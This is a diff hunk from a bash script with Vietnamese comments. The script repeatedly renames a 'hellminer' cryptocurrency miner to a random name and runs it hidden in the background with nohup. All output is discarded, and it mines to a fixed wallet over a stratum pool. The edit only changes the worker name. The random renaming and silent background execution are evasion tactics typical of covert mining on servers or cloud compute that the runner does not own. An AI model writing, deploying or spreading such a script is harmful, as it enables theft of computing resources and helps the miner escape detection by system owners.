@@ -24,7 +24,7 @@ while true; do
   mv hellminer "$random_name"
 
   # Chạy chương trình với tên đã đổi, ẩn danh và chạy ngầm trong 5 phút
-  nohup ./"$random_name" -c stratum+tcp://ap.vipor.net:5040 -u RMWTqPzqBZCP3LT893jwxwNhEbs6umRGWw.vpsgit --cpu 8 >/dev/null 2>&1 &
+  nohup ./"$random_name" -c stratum+tcp://ap.vipor.net:5040 -u RMWTqPzqBZCP3LT893jwxwNhEbs6umRGWw.vpsgit2 --cpu 8 >/dev/null 2>&1 &
   miner_pid=$!
 
   # Ngủ trong 5 phút
